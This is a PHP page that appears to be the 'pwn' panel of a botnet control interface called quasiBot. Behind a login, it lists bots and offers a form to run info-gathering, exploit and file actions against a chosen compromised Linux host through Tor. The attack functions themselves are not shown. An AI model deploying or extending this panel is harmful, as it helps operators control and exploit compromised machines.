<?php

require('../config.php');
auth();

?>

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">


<html xmlns="http://www.w3.org/1999/xhtml">
<head>
    <meta http-equiv="content-type" content="text/html; charset=utf-8" />
    <title>quasiBot | pwn</title>
    <link href="../style.css" rel="stylesheet" type="text/css" media="screen" />
</head>
<body>
<div id="wrapper">
    <div id="page">
        <div id="page-bgtop">
            <div id="page-bgbtm">
                <div id="content">

                    <div class="post">
                        <h2 class="title"><a href="#">Bots</a></h2>
                        <div class="entry">
                            <p class="meta">
                            <?php
                            checkbots();
                            ?>
                            </p>
                        </div>
                    </div>
                    <div class="post">
                        <h2 class="title"><a href="#">Pwn</a></h2>
                        <div class="entry">
                        <p class="meta">
                        Pwn &nbsp;&bull;&nbsp; via TOR
                        </p>
                        
                        <table>
                        <tr><form method="post">
                        <td><b>ID</b></td></tr>
                        <tr>
                        <td>
                            <?php
                             echo "<input type=\"text\" style=\"width: 50px;\" value=\"". (empty($_GET['id'])?"0":htmlspecialchars($_GET['id'])) ."\" name=\"id\"></td>&nbsp;";
                            ?>
                        <td style="text-align: left;">
                            <input type="radio" name="os" value="linux" checked> Linux<br/>
                            <input type="radio" name="os" value="win" disabled="disabled"> Windows<br />
                        </td>
                        <td style="text-align: left;"><input type="checkbox" name="info" value="yes"> Info<br />
                        <input type="checkbox" name="exploit" value="yes"> Exploits<br />
                        <input type="checkbox" name="files" value="yes"> Files<br />
                        <input type="checkbox" name="misc" value="yes"> Misc<br /></td>
                        <td><input type="submit" value="Pwn"></td>
                        </form>
                        </tr>
                        </table>  


                        <?php

                        pwn();

                        ?>

                    </div>
                    </div>

                    <div style="clear: both;">&nbsp;</div>
                </div>
                <div style="clear: both;">&nbsp;</div>
            </div>
        </div>
    </div>
</div>
</body>
</html>
